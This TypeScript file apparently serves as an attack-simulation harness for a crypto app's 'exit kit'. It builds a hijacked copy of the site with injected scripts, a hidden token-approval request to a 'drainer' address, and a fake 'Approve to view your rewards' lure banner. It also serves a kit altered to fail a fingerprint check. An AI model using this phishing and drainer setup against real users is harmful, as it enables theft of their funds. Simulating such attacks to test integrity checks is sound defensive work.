import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import type { Address } from 'viem';
import { envPort, json, serve } from './http';
import { hijackRequest } from './hijack-request';
import { withControl } from './site';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');

/** Tampered kit: one byte changed in the title — enough to fail the ENS fingerprint check. */
export function tamperKit(html: Buffer): Buffer {
  const s = html.toString('utf8');
  const i = s.indexOf('<title>Copeybara exit kit</title>');
  if (i < 0) throw new Error('kit title not found');
  return Buffer.from(s.replace('<title>Copeybara exit kit</title>', '<title>Copeybara exit klt</title>'), 'utf8');
}

export function startHijack(opts: { port?: number; kitFile: string; token: Address; drainer?: Address; controlUrl?: string }) {
  const page = withControl(readFileSync(join(ROOT, 'site', 'index.html'), 'utf8'), opts.controlUrl).replace(
    '<script src="/app.js"></script>',
    `<script src="/app.js"></script>\n  <script>window.__HIJACK_REQUEST__=${JSON.stringify(hijackRequest(opts.token, opts.drainer))}</script>\n  <script src="/inject.js"></script>`,
  ).replace(
    '<!--LURE-->',
    // the attacker's only visible change: a "rewards" banner styled like the rest of the app
    '<div class="lure"><svg class="i" viewBox="0 0 24 24"><rect x="3" y="8" width="18" height="4" rx="1"/><path d="M12 8v13M5 12v9h14v-9M7.5 8a2.5 2.5 0 0 1 0-5C10 3 12 8 12 8s2-5 4.5-5a2.5 2.5 0 0 1 0 5"/></svg><span>Your LP rewards are ready. <b>Approve to view your rewards</b>, then click Connect wallet.</span></div>',
  );
  const tampered = tamperKit(readFileSync(opts.kitFile));
  return serve(opts.port ?? envPort('HIJACK_PORT', 8082), (req, res) => {
    const path = (req.url ?? '/').split('?')[0];
    if (path === '/') return void res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }).end(page);
    if (path === '/app.js') return void res.writeHead(200, { 'content-type': 'text/javascript' }).end(readFileSync(join(ROOT, 'site', 'app.js')));
    if (path === '/inject.js') return void res.writeHead(200, { 'content-type': 'text/javascript' }).end(readFileSync(join(ROOT, 'hijack', 'inject.js')));
    if (path === '/copeybara-kit.html') return void res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }).end(tampered);
    if (path === '/hijack-request.json') return json(res, hijackRequest(opts.token, opts.drainer));
    res.writeHead(404).end();
  });
}
